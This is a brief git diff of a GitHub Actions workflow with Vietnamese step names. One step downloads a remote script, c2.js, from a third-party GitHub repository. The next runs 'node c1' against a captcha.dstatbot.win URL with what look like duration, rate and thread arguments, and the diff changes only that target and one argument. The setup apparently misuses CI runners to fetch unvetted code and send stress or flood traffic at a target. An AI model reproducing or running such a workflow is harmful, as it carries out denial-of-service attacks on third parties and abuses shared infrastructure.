@@ -16,4 +16,4 @@ jobs:
       - name: Lệnh #4
         run: curl -L -o c2.js https://raw.githubusercontent.com/occhoahihihih/helloworld/main/c2.js
       - name: Lệnh #5
-        run: node c1 https://captcha.dstatbot.win/12493314-0255-451b-830f-5f7ed9385aa5 260 2 8
+        run: node c1 https://captcha.dstatbot.win/740dd9d1-be78-47c9-9eb9-672064d7ed13 260 1 8
